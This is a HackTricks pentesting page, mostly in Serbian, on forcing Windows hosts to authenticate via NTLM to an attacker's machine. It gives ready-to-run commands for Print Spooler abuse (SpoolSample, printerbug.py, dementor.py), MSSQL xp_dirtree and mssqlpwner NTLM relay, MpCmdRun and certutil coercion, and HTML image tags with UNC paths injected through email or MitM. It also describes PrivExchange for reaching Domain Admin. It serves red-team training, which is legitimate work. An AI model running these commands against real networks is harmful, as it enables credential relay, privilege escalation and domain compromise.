# Force NTLM Privileged Authentication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** kodiranih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.

## Zloupotreba Spooler Servisa

Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampačkog servera domen kontrolera **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
Napomena: kada štampač pošalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti račun računara** u ovoj autentifikaciji.

### Pronalaženje Windows Servera na domenu

Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa se fokusirajmo na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finding Spooler services listening

Koristeći malo modifikovani @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler servis sluša:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Možete takođe koristiti rpcdump.py na Linux-u i tražiti MS-RPRN protokol.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Zamolite servis da se autentifikuje protiv proizvoljnog hosta

Možete kompajlirati[ **SpoolSample odavde**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako ste na Linuxu
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinovanje sa Neograničenom Delegacijom

Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **naterati štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** **računarskog naloga štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Kako je napadač već kompromitovao ovaj host, moći će da **dobije ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).

## RCP Prisilna autentifikacija

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da Exchange server bude primoran od strane bilo kog korisnika domena sa poštanskim sandučetom da se autentifikuje na bilo kojem hostu koji obezbeđuje klijent preko HTTP-a.

Podrazumevano, **Exchange usluga se pokreće kao SYSTEM** i dobija prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno vađenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administratoru Domena sa bilo kojim autentifikovanim korisničkim nalogom domena.

## Unutar Windows-a

Ako ste već unutar Windows mašine, možete naterati Windows da se poveže sa serverom koristeći privilegovane naloge sa:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (Microsoft-ov potpisani binarni fajl) za primoravanje NTLM autentifikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, možete mu jednostavno poslati **email sa 1x1 slikom** kao što je
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i kada ga otvori, pokušaće da se autentifikuje.

### MitM

Ako možete da izvršite MitM napad na računar i ubacite HTML u stranicu koju će vizualizovati, mogli biste pokušati da ubacite sliku poput sledeće u stranicu:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emite da je potrebno postaviti Responder izazov na "1122334455667788"_

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
